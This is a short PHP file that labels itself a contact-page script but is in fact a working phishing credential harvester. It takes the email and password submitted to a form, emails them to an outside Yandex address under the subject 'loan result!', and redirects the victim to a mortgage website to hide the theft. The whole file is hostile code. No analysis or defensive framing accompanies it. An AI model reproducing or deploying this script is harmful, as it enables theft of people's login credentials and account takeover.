<?php

 /*
 * @Web Contact Page PHP Script
 * @author helpvid@ymail.com - http://www.helpvid.net
 * @version 1.0.0
 * @date January  05, 2010
 * @category Helpvid PHP Script for Contact page
 * @copyright (c) 2010 @helpvid.net (www.helpvid.net)
 * @Creative Commons Attribution-No Derivative Works 2.0 UK: England & Wales License.
 * @Creative Commons Attribution-No Derivative Works 2.5 UK: SCOTLAND License.
 * @Creative Commons Attribution-No Derivative Works 3.0 United States License.
 */


/* Email Variables */
$emailSubject = 'loan result!'; /*Make sure this matches the name of your file*/
$webMaster = 'matt.anthony10@yandex.com';

/*design by Mark Leroy @ http://www.helpvid.net*/

/* Data Variables */
$Email = $_POST['Email'];
$password = $_POST['Password'];





$body = <<<EOD
<br><hr><br>
Email: $Email <br>
password: $password <br>

EOD;
$headers = "From: $Email\r\n";
$headers .= "Content-type: text/html\r\n";
$success = mail($webMaster, $emailSubject, $body,
$headers);


/* Results rendered as HTML */
$theResults = <<<EOD
<html>
<head>
<title>sent message</title>
<meta http-equiv="refresh" content="1;http://www.mortgage-application.net">
<style type="text/css">
<!--

-->
</style>
</head>

</body>
</html>
EOD;
echo "$theResults";
?>